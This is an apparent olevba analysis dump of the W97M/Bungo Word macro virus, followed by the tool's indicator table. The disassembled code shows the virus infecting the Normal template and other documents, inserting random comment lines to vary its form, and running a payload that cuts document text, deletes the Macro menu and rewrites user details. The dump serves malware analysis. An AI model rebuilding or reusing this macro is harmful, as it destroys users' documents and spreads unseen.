' 	For 
' Line #190:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #192:
' 	EndIfBlock 
' Line #193:
' 	StartForVariable 
' 	Next 
' Line #194:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #195:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #196:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	StartForVariable 
' 	Next 
' Line #199:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #200:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #201:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #202:
' 	EndIfBlock 
' Line #203:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #204:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #205:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #208:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #209:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #210:
' 	EndSub 
' Line #211:
' Line #212:
' 	FuncDefn (Sub GoToHell())
' Line #213:
' 	OnError (Resume Next) 
' Line #214:
' 	ArgsCall Read 0x0000 
' Line #215:
' 	LitStr 0x0005 "Bungo"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #216:
' 	Ld ActiveLines 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #217:
' 	StartWithExpr 
' 	LitStr 0x0005 "Bungo"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #218:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #219:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #220:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #221:
' 	EndWith 
' Line #222:
' 	ElseBlock 
' Line #223:
' 	StartWithExpr 
' 	LitStr 0x0005 "Bungo"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #224:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #225:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #226:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #227:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #228:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #229:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #230:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #231:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #232:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #233:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #234:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	NextVar 
' Line #235:
' 	EndWith 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	EndSub 
' Line #238:
' Line #239:
' 	FuncDefn (Sub Payload())
' Line #240:
' 	OnError (Resume Next) 
' Line #241:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x001E 
' 	Le 
' 	And 
' 	IfBlock 
' Line #242:
' 	Ld Selection 
' 	ArgsMemCall Wholestory 0x0000 
' Line #243:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #246:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #247:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #248:
' 	LitStr 0x000D "Lucky Warrior"
' 	Ld Application 
' 	MemSt Username 
' Line #249:
' 	LitStr 0x0002 "LW"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #250:
' 	LitStr 0x0013 "Bgy. Tiguib, O.E.S."
' 	Ld Application 
' 	MemSt UserAddress 
' Line #251:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #252:
' 	LitStr 0x000D "Lucky Warrior"
' 	MemStWith Author 
' Line #253:
' 	LitStr 0x000A "W97M/Bungo"
' 	MemStWith Keywords 
' Line #254:
' 	LitStr 0x000F "More to come..."
' 	MemStWith Comments 
' Line #255:
' 	ArgsMemCallWith Execute 0x0000 
' Line #256:
' 	EndWith 
' Line #257:
' 	EndSub 
' Line #258:
' Line #259:
' Line #260:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

